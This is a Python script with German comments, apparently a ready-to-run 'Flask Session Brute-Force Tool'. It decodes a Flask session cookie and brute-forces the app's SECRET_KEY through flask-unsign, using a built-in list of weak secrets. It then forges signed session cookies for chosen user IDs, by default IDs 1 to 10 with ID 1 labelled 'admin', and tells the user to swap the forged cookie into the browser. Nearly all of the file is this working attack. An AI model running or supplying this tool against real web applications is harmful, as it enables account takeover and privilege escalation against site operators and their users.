#!/usr/bin/env python3
import subprocess
import sys
import json
import base64
import zlib

# Wordlist mit häufigen SECRET_KEYs
COMMON_SECRETS = [
    "secret",
    "password",
    "supersecret",
    "mysecret",
    "key",
    "flask-secret",
    "development",
    "dev",
    "test",
    "password123",
    "admin",
    "changeme",
    "secret_key",
    "secretkey",
    "my_secret_key",
    "app_secret",
    "flask",
    "1234567890",
    "qwerty",
    "abc123",
]


FLASK_UNSIGN_CMD = None

def check_flask_unsign():
    """Prüft ob flask-unsign installiert ist und findet den Pfad"""
    global FLASK_UNSIGN_CMD

    # Versuche verschiedene Wege flask-unsign zu finden
    options = [
        ["flask-unsign", "--version"],
        ["python3", "-m", "flask_unsign", "--version"],
        ["/Users/marcmenning/Library/Python/3.9/bin/flask-unsign", "--version"],
    ]

    for cmd in options:
        try:
            result = subprocess.run(cmd[:-1] + ["--version"], capture_output=True, text=True)
            if result.returncode == 0 or "flask-unsign" in result.stdout.lower():
                FLASK_UNSIGN_CMD = cmd[:-1]  # Ohne --version
                return True
        except FileNotFoundError:
            continue

    return False


def decode_session_payload(session_cookie: str) -> dict:
    """Dekodiert den Payload einer Flask Session (ohne Signaturprüfung)"""
    try:
        # Erster Teil ist der Payload
        payload = session_cookie.split('.')[0]

        # Flask verwendet URL-safe Base64
        # Padding hinzufügen falls nötig
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding

        # Base64 dekodieren
        decoded = base64.urlsafe_b64decode(payload)

        # Wenn komprimiert (beginnt mit .), dekomprimieren
        if session_cookie.startswith('.'):
            decoded = zlib.decompress(decoded)

        # JSON parsen
        return json.loads(decoded)
    except Exception as e:
        print(f"[!] Fehler beim Dekodieren: {e}")
        return {}


def bruteforce_secret(session_cookie: str, wordlist_file: str = None) -> tuple:
    """Brute-forced den SECRET_KEY einer Flask Session. Gibt (secret, payload) zurück."""

    print("[*] Starte Brute-Force Angriff auf Flask Session...")
    print(f"[*] Session Cookie: {session_cookie[:50]}...")

    # Zeige den dekodierten Payload
    payload = decode_session_payload(session_cookie)
    if payload:
        print(f"[*] Dekodierter Payload: {json.dumps(payload, indent=2)}")

    # flask-unsign mit Wordlist aufrufen
    if wordlist_file:
        cmd = FLASK_UNSIGN_CMD + ["--unsign", "--cookie", session_cookie,
               "--wordlist", wordlist_file]
    else:
        # Temporäre Wordlist erstellen
        with open("/tmp/flask_secrets.txt", "w") as f:
            f.write("\n".join(COMMON_SECRETS))
        cmd = FLASK_UNSIGN_CMD + ["--unsign", "--cookie", session_cookie,
               "--wordlist", "/tmp/flask_secrets.txt"]

    print(f"[*] Führe aus: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        # Secret gefunden
        secret = result.stdout.strip().split("'")[-2] if "'" in result.stdout else result.stdout.strip()
        print(f"\n[+] SECRET_KEY GEFUNDEN: {secret}")
        return secret, payload
    else:
        print(f"[!] Brute-Force fehlgeschlagen: {result.stderr}")
        return None, payload


def create_forged_session(secret_key: str, user_id: int, username: str) -> str:
    """Erstellt eine gefälschte Flask Session mit beliebigen User-Daten"""

    session_data = {
        "user": {
            "id": user_id,
            "username": username
        }
    }

    print(f"\n[*] Erstelle gefälschte Session für: {username} (ID: {user_id})")

    cmd = FLASK_UNSIGN_CMD + [
        "--sign",
        "--cookie", json.dumps(session_data),
        "--secret", secret_key
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        forged_cookie = result.stdout.strip()
        print(f"[+] Gefälschte Session erstellt!")
        print(f"[+] Cookie: {forged_cookie}")
        return forged_cookie
    else:
        print(f"[!] Fehler: {result.stderr}")
        return None


def main():
    print("=" * 60)
    print("Flask Session Brute-Force Tool")
    print("=" * 60)

    # Prüfe flask-unsign
    if not check_flask_unsign():
        print("[!] flask-unsign ist nicht installiert!")
        print("[*] Installiere mit: pip install flask-unsign")
        sys.exit(1)

    print("[+] flask-unsign gefunden\n")

    # Session Cookie abfragen
    session_cookie = input("Session Cookie: ").strip()

    if not session_cookie:
        print("[!] Kein Cookie eingegeben!")
        sys.exit(1)

    # SECRET_KEY brute-forcen
    secret, original_payload = bruteforce_secret(session_cookie)

    if not secret:
        print("\n[!] SECRET_KEY konnte nicht gefunden werden.")
        print("[*] Versuche eine groessere Wordlist (z.B. rockyou.txt)")
        sys.exit(1)

    # Aktuelle User-Daten aus dem Cookie extrahieren
    current_user = original_payload.get("user", {})
    current_id = current_user.get("id", "?")
    current_name = current_user.get("username", "?")

    # Neue Session erstellen
    print("\n" + "-" * 40)
    print("Neue Session erstellen")
    print("-" * 40)
    print(f"Deine aktuelle Session: ID={current_id}, Username={current_name}")
    print()
    print("Optionen:")
    print("  [1] Einzelne User-ID eingeben")
    print("  [2] Mehrere Sessions generieren (ID 1-10)")
    print()

    try:
        choice = input("Auswahl [2]: ").strip() or "2"

        if choice == "1":
            target_input = input("Ziel User-ID: ").strip()
            target_user_id = int(target_input) if target_input else 1
            default_username = "admin" if target_user_id == 1 else f"user{target_user_id}"
            target_username = input(f"Username [{default_username}]: ").strip() or default_username

            forged_cookie = create_forged_session(secret, target_user_id, target_username)

            if forged_cookie:
                print("\n" + "=" * 60)
                print("SESSION COOKIE:")
                print("=" * 60)
                print(f"\n{forged_cookie}\n")
                print("=" * 60)

        else:
            # Sessions fuer ID 1-10 generieren
            print("\n" + "=" * 60)
            print("GENERIERTE SESSIONS (ID 1-10)")
            print("=" * 60)
            print("Kopiere einen Cookie und ersetze ihn im Browser.\n")

            for uid in range(1, 11):
                session_data = {"user": {"id": uid, "username": f"user{uid}"}}

                cmd = FLASK_UNSIGN_CMD + [
                    "--sign",
                    "--cookie", json.dumps(session_data),
                    "--secret", secret
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)

                if result.returncode == 0:
                    cookie = result.stdout.strip()
                    marker = " <-- DU" if uid == current_id else ""
                    print(f"ID {uid:2}: {cookie}{marker}")

            print("\n" + "=" * 60)
            print("Cookie im Browser ersetzen -> Seite neu laden")
            print("=" * 60)

    except ValueError:
        print("[!] Ungueltige Eingabe!")
        sys.exit(1)


if __name__ == "__main__":
    main()
